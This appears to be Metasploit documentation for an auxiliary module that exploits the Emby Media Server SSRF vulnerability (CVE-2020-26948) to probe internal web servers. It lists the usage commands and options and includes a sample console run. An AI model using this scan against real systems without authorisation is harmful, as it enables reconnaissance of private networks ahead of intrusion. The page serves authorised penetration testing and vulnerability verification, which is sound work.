## Vulnerable Application
This module has been tested on Emby Media Server versions older than 4.5.

### Description

Generates a `GET` request to the provided web servers and executes an SSRF against the targeted EMBY server.
Returns the server header, HTML title, and location header. This is useful for rapidly identifying web applications
on the internal network using the Emby SSRF vulnerability (CVE-2020-26948).

## Verification Steps

  1. Do: `use auxiliary/scanner/http/emby_ssrf_scanner`
  2. Do: `set rhosts [ips]`
  3. Do: `set emby_server [emby_server_ip]`
  4. Do: `run`

## Options

### PORTS

Select which ports to check for HTTP servers internal to the Emby server. Defaults to `80,8080,8081,8888`.

### EMBY_SERVER

IP address of the Emby server to use. Required.

### EMBY_PORT

Emby server access port. Defaults to 8096.
### SHOW_TITLES

If set to `false`, will not show the titles on the console as they are grabbed. Defaults to `true`.
### STORE_NOTES

If set to `false`, will not store the captured information in notes. Use `notes -t http.title` to view. Defaults to `true`.

## Scenarios

### Emby Server (v4.4.3 on Ubuntu) - Scan Internal 192.168.2.0 Network

```
msf6 > use auxiliary/scanner/http/emby_ssrf_scanner
msf6 auxiliary(scanner/http/emby_ssrf_scanner) > set emby_server 10.10.200.32
emby_server => 10.10.200.32
msf6 auxiliary(scanner/http/emby_ssrf_scanner) > set rhosts 192.168.2.3
rhosts => 192.168.2.3
msf6 auxiliary(scanner/http/emby_ssrf_scanner) > run

[+] 192.168.2.3:8096 Title: Emby
[+] 192.168.2.3:8096     HTTP Code: 200
[+] 192.168.2.3:8096     Location Header:
[+] 192.168.2.3:8096     Server Header: UPnP/1.0 DLNADOC/1.50
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
